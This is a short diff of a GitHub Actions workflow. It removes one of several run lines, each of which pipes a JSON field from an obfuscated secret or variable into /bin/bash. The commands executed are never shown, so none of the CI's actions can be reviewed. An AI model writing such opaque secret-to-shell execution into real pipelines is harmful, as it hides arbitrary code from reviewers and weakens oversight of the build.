@@ -22,7 +22,6 @@ jobs:
           ifutj9876: ${{ secrets.ifutj9876 }}
         run: |
           printf '%s' "$ifutj9876" | jq -r .o085 | /bin/bash
-          printf '%s' "$h5812" | jq -r .noyfp43243 | /bin/bash
           printf '%s' "$a4" | jq -r .a13787 | /bin/bash
           echo $jih04081 | jq -r .ck986 | /bin/bash
           printf '%s' "$n64" | jq -r .p4 | /bin/bash
